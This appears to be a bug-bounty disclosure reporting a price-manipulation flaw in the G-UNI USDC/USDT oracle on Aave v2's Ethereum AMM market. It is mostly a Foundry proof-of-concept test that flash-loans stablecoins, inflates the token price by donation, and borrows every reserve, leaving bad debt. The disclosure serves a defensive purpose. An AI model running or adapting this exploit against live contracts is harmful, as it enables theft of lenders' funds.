## Bug Description
- Where: [GUNI USDC/USDT oracle](https://etherscan.io/address/0x399e3bb2BBd49c570aa6edc6ac390E0D0aCbbD5e#code)
- Description:
    - At this time there are only 11 G-UNI USDC/USDT [token holders](https://etherscan.io/token/tokenholderchart/0xd2eec91055f07fe24c9ccb25828ecfefd4be0c41) other than [aAmmGUniUSDCUSDT](https://etherscan.io/address/0xCa5DFDABBfFD58cfD49A9f78Ca52eC8e0591a3C5).
    - If an attacker manager so that the only holders of G-UNI USDC/USDT token are attacker and/or aAmmGUniUSDCUSDT then attacker can inflate/defalte the price of G-UNI USDC/USDT token as they want to steal all the available tokens($2.83M) from AAVE v2 Ethereum AMM Market. 
    - Please take a look at the POC on how attacker achives the price manipulation via donation of tokens. 
    - This attack doesn't work right now but attacker has $2.83M of incentive to convince the other 11 G-UNI USDC/USDT token holders to either burn their tokens or send them to the attacker.

## Impact
- All of funds available to borrow is at risk

## Risk Breakdown
- Difficulty to Exploit: Medium
- Threat Level: Critical

## Recommendation
- send 1000 wei of GUNI USDC/USDT tokens to a dead address to avoid this possiblility.

## 

## POC
- Initiate a new foundry repo by running forge init. see [here](https://book.getfoundry.sh/projects/creating-a-new-project)
- Add the below code in `test/oracleManipulationAttack.t.sol`
- Run the test with `forge test --fork-url MAINNET_RPC_URL --fork-block-number 16871493 -vvvv`

```
//test/oracleManipulationAttack.t.sol
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

interface IERC20 {
    function transfer(
        address recipient,
        uint256 amount
    ) external returns (bool);

    function balanceOf(address account) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function totalSupply() external view returns (uint256);
}

library TransferHelper {
    function safeTransfer(address token, address to, uint256 value) internal {
        (bool success, bytes memory data) = token.call(
            abi.encodeWithSelector(IERC20.transfer.selector, to, value)
        );
        require(
            success && (data.length == 0 || abi.decode(data, (bool))),
            "TF"
        );
    }

    function safeApprove(address token, address to, uint256 value) internal {
        (bool success, bytes memory data) = token.call(
            abi.encodeWithSelector(IERC20.approve.selector, to, value)
        );
        require(
            success && (data.length == 0 || abi.decode(data, (bool))),
            "TF"
        );
    }
}

interface IGUNI is IERC20 {
    function pool() external view returns (address);

    function token0() external view returns (address);

    function token1() external view returns (address);

    function lowerTick() external view returns (int24);

    function upperTick() external view returns (int24);

    function getPositionID() external view returns (bytes32);

    function mint(
        uint256 mintAmount,
        address receiver
    )
        external
        returns (uint256 amount0, uint256 amount1, uint128 liquidityMinted);

    function burn(
        uint256 burnAmount,
        address receiver
    )
        external
        returns (uint256 amount0, uint256 amount1, uint128 liquidityBurned);
}

interface ILendingPool {
    function borrow(
        address asset,
        uint256 amount,
        uint256 interestRateMode,
        uint16 referralCode,
        address onBehalfOf
    ) external;

    function deposit(
        address asset,
        uint256 amount,
        address onBehalfOf,
        uint16 referralCode
    ) external;

    function setUserUseReserveAsCollateral(
        address asset,
        bool useAsCollateral
    ) external;

    function flashLoan(
        address receiverAddress,
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata modes,
        address onBehalfOf,
        bytes calldata params,
        uint16 referralCode
    ) external;

    function getUserAccountData(
        address user
    )
        external
        view
        returns (
            uint256 totalCollateralETH,
            uint256 totalDebtETH,
            uint256 availableBorrowsETH,
            uint256 currentLiquidationThreshold,
            uint256 ltv,
            uint256 healthFactor
        );
}

interface IFlashloanProvider {
    function flashLoan(
        address recipient,
        IERC20[] memory tokens,
        uint256[] memory amounts,
        bytes memory userData
    ) external;
}

interface IGUNIOracle {
    function latestAnswer() external view returns (int256);
}

contract OracleManipulationAttack is Test {
    IGUNI public constant guniToken =
        IGUNI(0xD2eeC91055F07fE24C9cCB25828ecfEFd4be0c41); //GUNI USDC/USDT
    IGUNIOracle public constant guniOracle =
        IGUNIOracle(0x399e3bb2BBd49c570aa6edc6ac390E0D0aCbbD5e);
    ILendingPool public constant lendingPool =
        ILendingPool(0x7937D4799803FbBe595ed57278Bc4cA21f3bFfCB);
    address public constant aguniToken =
        0xCa5DFDABBfFD58cfD49A9f78Ca52eC8e0591a3C5;
    address public constant aUSDC = 0xd24946147829DEaA935bE2aD85A3291dbf109c80;
    address public constant aUSDT = 0x17a79792Fe6fE5C95dFE95Fe3fCEE3CAf4fE4Cb7;

    address public constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address public constant aDAI = 0x79bE75FFC64DD58e66787E4Eae470c8a1FD08ba4;

    address public constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address public constant aWETH = 0xf9Fb4AD91812b704Ba883B11d2B576E890a6730A;

    address public constant WBTC = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;
    address public constant aWBTC = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;

    IFlashloanProvider public constant flashloanProvider =
        IFlashloanProvider(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    address public pool;

    IERC20 public token0; //USDC
    IERC20 public token1; //USDT

    int24 public lowerTick;
    int24 public upperTick;
    bytes32 public positionID;

    int256 public latestPriceBefore;
    int256 public latestPriceAfter;

    function setUp() public {
        pool = guniToken.pool();
        token0 = IERC20(guniToken.token0());
        token1 = IERC20(guniToken.token1());

        lowerTick = guniToken.lowerTick();
        upperTick = guniToken.upperTick();
        positionID = guniToken.getPositionID();

        // this is something that will be achived by an attacker via social engineering
        // The incentive right now 2.82M for an attacker to make sure below happens
        address[11] memory currentHolders = [
            0xD45Cc16C7cB60449926991db9cba7fb00f372E51,
            0xddfDb0D8681e7d701eFB8bE5151928aF1e552a52,
            0xf0158F64010440bE7271B8A6aFF23dcA350c73bE,
            0x08d8Db85AD681Fa6a80c0D1Fab9312F00D1A1888,
            0x4E61548D94C8649ebfC2f5F54D2272FcBC687BF2,
            0x5b5Fe48c3Ecf26c27876c072A99D25C5FC75970d,
            0x7C0f0bB5ae6E7d94944238A9D719266ef035b20f,
            0x7dAb6caa4eB3B6352664FC0FFEaC212620305387,
            0xaaC7359Fb5D39Db6C562cACe5E0947b591F16fF5,
            0xB0fE03fD4Fbf550A8BBC491b934E395dD376c918,
            0xbd42878d3cC49BB4903DF1f04E7b445ECA4bd238
        ];
        for (uint8 i = 0; i < currentHolders.length; i++) {
            vm.startPrank(currentHolders[i]);
            guniToken.burn(
                guniToken.balanceOf(currentHolders[i]),
                currentHolders[i]
            );
            vm.stopPrank();
        }
        //attacker and or aGUNIToken need to be the only token holders for this attack to work
        assert(
            guniToken.balanceOf(address(aguniToken)) == guniToken.totalSupply()
        );

        TransferHelper.safeApprove(
            address(token0),
            address(guniToken),
            type(uint256).max
        );
        TransferHelper.safeApprove(
            address(token1),
            address(guniToken),
            type(uint256).max
        );
    }

    function testAttack() public {
        IERC20[] memory tokens = new IERC20[](2);
        tokens[0] = (token0);
        tokens[1] = (token1);
        uint256[] memory amounts = new uint256[](2);
        amounts[0] = token0.balanceOf(address(flashloanProvider));
        amounts[1] = token1.balanceOf(address(flashloanProvider));

        //borrow some USDC and or USDT to inflate the price of GUNI token
        flashloanProvider.flashLoan(address(this), tokens, amounts, "");
        //see receiveFlashLoan function
    }

    function receiveFlashLoan(
        IERC20[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory /*feeAmounts*/,
        bytes memory /*userData*/
    ) external {
        //mint a few GUNI tokens
        (uint256 amount0, uint256 amount1, uint128 liquidityMinted) = guniToken
            .mint(guniToken.balanceOf(aguniToken), address(this));

        // //approve GUNI tokens to lending Pool
        TransferHelper.safeApprove(
            address(guniToken),
            address(lendingPool),
            guniToken.balanceOf(address(this))
        );
        lendingPool.deposit(
            address(guniToken),
            guniToken.balanceOf(address(this)),
            address(this),
            0
        );
        lendingPool.setUserUseReserveAsCollateral(address(guniToken), true);

        // int256 latestPriceBefore = guniOracle.latestAnswer();
        // console.log("latestPriceBefore:", uint256(latestPriceBefore));

        (, , uint256 availableBorrowsETH, , , ) = lendingPool
            .getUserAccountData(address(this));
        //no borrowing power at this stage
        assert(availableBorrowsETH / 1e18 == 0);

        //inflate the GUNI token price by donating the tokens to the GUNI token contract
        //this is where if the aToken is not the only token holders, attacker looses money by donating
        TransferHelper.safeTransfer(
            address(token0),
            address(guniToken),
            token0.balanceOf(address(this))
        );
        TransferHelper.safeTransfer(
            address(token1),
            address(guniToken),
            token1.balanceOf(address(this))
        );

        (, , availableBorrowsETH, , , ) = lendingPool.getUserAccountData(
            address(this)
        );

        //a lot of borrowing power now
        assert(availableBorrowsETH / 1e18 > 5000);

        // int256 latestPriceAfter = guniOracle.latestAnswer();
        // console.log("latestPriceAfter:", uint256(latestPriceAfter));

        //borrow all the tokens available
        lendingPool.borrow(
            address(token0),
            token0.balanceOf(aUSDC), //borrow all the USDC available (289.09K)
            2,
            0,
            address(this)
        );
        lendingPool.borrow(
            address(token1),
            token1.balanceOf(aUSDT), //borrow all the USDT available (149.47K)
            2,
            0,
            address(this)
        );
        lendingPool.borrow(
            WETH,
            IERC20(WETH).balanceOf(aWETH), //borrow all the WETH available (925.22K)
            2,
            0,
            address(this)
        );
        lendingPool.borrow(
            DAI,
            IERC20(DAI).balanceOf(aDAI), //borrow all the DAI available (147.07K)
            2,
            0,
            address(this)
        );

        lendingPool.borrow(
            WBTC,
            IERC20(WBTC).balanceOf(aWBTC), //borrow all the WBTC available 1.16M
            2,
            0,
            address(this)
        );

        //take a flashloan of all the balance of GUNIToken
        address[] memory assets = new address[](1);
        assets[0] = address(guniToken);
        uint256[] memory amounts1 = new uint256[](1);
        amounts1[0] = guniToken.balanceOf(address(aguniToken));

        uint256[] memory modes = new uint256[](1);
        modes[0] = 0;
        lendingPool.flashLoan(
            address(this),
            assets,
            amounts1,
            modes,
            address(this),
            "",
            0
        );
        //see executeOperation function where attacker gets the donated amounts back

        (uint256 totalCollateralETH, uint256 totalDebtETH, , , , ) = lendingPool
            .getUserAccountData(address(this));

        assert(totalCollateralETH / 1e18 == 0); //no collateral
        assert(totalDebtETH / 1e18 > 1000); // a lot of bad debt

        //repay the flashloan
        TransferHelper.safeTransfer(address(tokens[0]), msg.sender, amounts[0]);
        TransferHelper.safeTransfer(address(tokens[1]), msg.sender, amounts[1]);
    }

    function executeOperation(
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata premiums,
        address /*initiator*/,
        bytes calldata /*params*/
    ) external returns (bool) {
        //burn all the GUNI tokens to get back the donated USDC and USDT
        guniToken.burn(guniToken.balanceOf(address(this)), address(this));
        assert(guniToken.totalSupply() == 0);
        //mint only the required amount of GUNI tokens
        guniToken.mint(amounts[0] + premiums[0], address(this));

        // int256 latestPriceAfter = guniOracle.latestAnswer();
        // console.log("latestPriceAfter:", uint256(latestPriceAfter));

        TransferHelper.safeApprove(
            assets[0],
            msg.sender,
            amounts[0] + premiums[0]
        );

        return true;
    }
}

```
